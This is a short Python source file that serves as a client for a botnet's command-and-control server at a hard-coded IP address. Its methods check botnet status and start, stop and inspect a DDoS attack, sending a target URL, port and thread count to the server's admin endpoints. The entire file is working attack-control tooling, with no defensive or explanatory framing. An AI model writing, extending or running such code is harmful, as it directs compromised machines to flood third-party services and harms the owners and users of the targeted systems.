import requests
import json


class Server:
    def __init__(self):
        self.ip = 'http://138.124.187.117:5000/'

    def get_status(self):
        return json.loads(requests.get(f'{self.ip}/admin/botnet-status').text)

    def start_attack(self, url, port, threads):
        config = {'running': True, 'ddos': {
            'target': url, 'port': port, 'threads': threads}}
        responce = requests.post(f'{self.ip}/admin/start_attack', json=config)
        return responce

    def stop_attack(self):
        return json.loads(requests.get(f'{self.ip}/admin/stop_attack').text)

    def get_attack_status(self):
        return json.loads(requests.get(f'{self.ip}/admin/attack-config').text)
